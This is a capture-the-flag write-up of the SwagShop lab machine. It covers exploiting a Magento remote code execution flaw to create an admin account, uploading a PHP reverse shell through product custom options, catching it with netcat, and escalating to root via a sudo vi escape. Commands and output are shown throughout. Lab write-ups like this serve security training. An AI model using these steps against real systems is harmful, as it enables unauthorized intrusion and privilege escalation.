# SwagShop - `OSCP Style`

Start: 30th November 2022 1:00pm

End: 30th November 2022 2:43pm

Setup
```console
$ export IP=10.10.10.140
$ mkdir nmap
```
Added `swagshop.htb` to `/etc/hosts`

Initial Recon
```console
$ nmap -A -T5 $IP -vv -oN nmap/initial

[REDACTED]
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

Full Port Scan
```console
$ sudo nmap -sS -T5 -n -p- $IP -vv -oN nmap/full

[REDACTED]
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
No other ports open.

Upon visiting `http://swagshop.htb`, I immediately saw it was running on `Magento 2014`.

Searching `magento` on Searchsploit resulted in the following:
```console
$ searchsploit magento                                                                     
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injecti | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code E | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/I | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting  | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write  | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Executi | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                  | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                  | xml/webapps/37977.py
Magento eCommerce CE v2.3.5-p2 - Blind SQLi                | php/webapps/50896.txt
Magento Server MAGMI Plugin - Multiple Vulnerabilities     | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusio | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Paym | php/webapps/48135.php
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

After fumbling around, this is the one that is usable:
```
Magento eCommerce - Remote Code Execution                  | xml/webapps/37977.py
```

The script is not runnable for some syntax issues, and it uses some old libraries. So we have to modify them before running it.

```python
target = "http://swagshop.htb/index.php"

pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query).encode("utf-8")
```
The script should be OK after modifying the code up here.

```console
$ python 37977.py                                                                          
WORKED
Check http://swagshop.htb/index.php/admin with creds forme:forme
```

Now we can login at `http://swagshop.htb/index.php/admin` using `forme:forme`.

Under `Catalog` -> `Manage Products`, we are able to modify the products.

Then I found out I can add a new option to an exisiting product to upload files with any extension that I desire.

Simply click on any product, then click `Custom Options`. Add a new option with the input type as `file` and allowed file extensions as `.php`. Don't forget to save it.

Head back to `http://swagshop.htb`, click on the modified product and there we can upload our PHP reverse shell. I got my shell from [revshells.com](https://revshells.com)'s PHP PentestMonkey. 

After placing the order, I get my netcat reverse shell ready.
```console
$ nc -lnvp 9999
listening on [any] 9999 ...
```

This is where I start to fustrate, how do I trigger the reverse shell?

I can go back to the admin panel to checking orders placed, and there I can see the file uploaded from there. But I wasn't able to trigger it, the shell got downloaded when I click on it.

Then I scanned for directories hoping there are any directories to store uploaded files.

```console
$ mkdir gobuster
$ gobuster dir -u $IP -w /usr/share/wordlists/dirb/common.txt -t 20 -o gobuster/common.txt

[REDACTED]
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/app                  (Status: 301) [Size: 310] [--> http://10.10.10.140/app/]
/errors               (Status: 301) [Size: 313] [--> http://10.10.10.140/errors/]
/favicon.ico          (Status: 200) [Size: 1150]
/includes             (Status: 301) [Size: 315] [--> http://10.10.10.140/includes/]
/index.php            (Status: 302) [Size: 0] [--> http://swagshop.htb/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.140/js/]
/lib                  (Status: 301) [Size: 310] [--> http://10.10.10.140/lib/]
/media                (Status: 301) [Size: 312] [--> http://10.10.10.140/media/]
/pkginfo              (Status: 301) [Size: 314] [--> http://10.10.10.140/pkginfo/]
/server-status        (Status: 403) [Size: 300]
/shell                (Status: 301) [Size: 312] [--> http://10.10.10.140/shell/]
/skin                 (Status: 301) [Size: 311] [--> http://10.10.10.140/skin/]
/var                  (Status: 301) [Size: 310] [--> http://10.10.10.140/var/]
```

`/media` caught my attention after browsing through the files in it, eventually I came up with `/media/custom_options/order/s/h/9fc9c4d5c7557c9d5540779e702a6951.php`.

When I click on it, I trigger the reverse shell.

```console
$ nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.140] 46646
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:04:10 up 59 min,  0 users,  load average: 0.01, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ bash -i
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/$ whoami
whoami
www-data
www-data@swagshop:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/$ 
```

### We are in as `www-data@swagshop`.

The ***user flag*** is at `/home/haris/user.txt`. We can read it as `www-data`.

## `www-data` to `root`

Sudo check reveals the following:
```console
www-data@swagshop:/var/www/html$ sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

In [gtfobins](https://gtfobins.github.io/gtfobins/vi/), we can use `vi` to open up a shell. Since we are able to run `vi` as `root` without password, we should be able to spawn a root shell.

But in order to use `vi`, we have to stabilize our shell.

### Stabilizing the reverse shell

1. Press `ctrl + z` to put the program at background.
2. `echo $TERM`, and remember the type of your terminal.
```console
$ echo $TERM
xterm-256color
```
3. Check the dimension of your terminal (rows, columns).
```console
$ stty -a

speed 38400 baud; rows 42; columns 189; line = 0;
intr = ^C; quit = ^\; erase = ^H; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl -ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```
4. `stty raw -echo`
5. `fg` to return to the reverse shell.
6. `reset`, here it will prompt for terminal type, type in the one at `step 2.`.
7. Tell the reverse shell our terminal size.
```console
www-data@swagshop:/var/www/html$ stty rows 42 columns 189
```

Now we can use `vi`.

Remember, we can only use `vi` as `root` in the `/var/www/html` directory.
```console
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/test
```

In vim editor:
1. Press `escape` button and enter `:set shell=/bin/sh`.
2. Press `escape` button and enter `:shell`

```console
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/test

[No write since last change]
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### We are now `root`!

The ***root flag*** is at `/root/root.txt`.

### Done!
